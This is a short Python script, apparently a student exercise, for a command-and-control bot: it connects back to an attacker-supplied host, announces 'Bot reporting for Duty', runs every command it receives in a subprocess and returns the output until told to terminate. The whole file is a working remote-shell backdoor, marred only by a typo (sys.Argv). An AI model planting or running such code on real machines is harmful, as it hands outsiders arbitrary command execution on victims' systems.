import sys
from subprocess import Popen, PIPE
from socket import *
serverName = sys.Argv[1] #to get the server address that is me! the attacker
serverPort = 8000 #to open a server on http

#AF_INET IS Ipv4 address family and sock_stream is tcp socket type

clientSocket= socket(AF_INET,SOCK_STREAM)
clientSocket.connect((serverName, serverPort))
clientSocket.send('Bot reporting for Duty'.encode()) #using encode to turn the message into binary in order to send it over the socket library
command = clientSocket.recv(4064).decode()
while command != 'terminate':
    proc = Popen(command.split(" "), stdout=PIPE,stderr = PIPE)
    result, err = proc.communicate()
    clientSocket.send(result)
    command=clientSocket.recv(4064).decode() # binary info again

clientSocket.close()
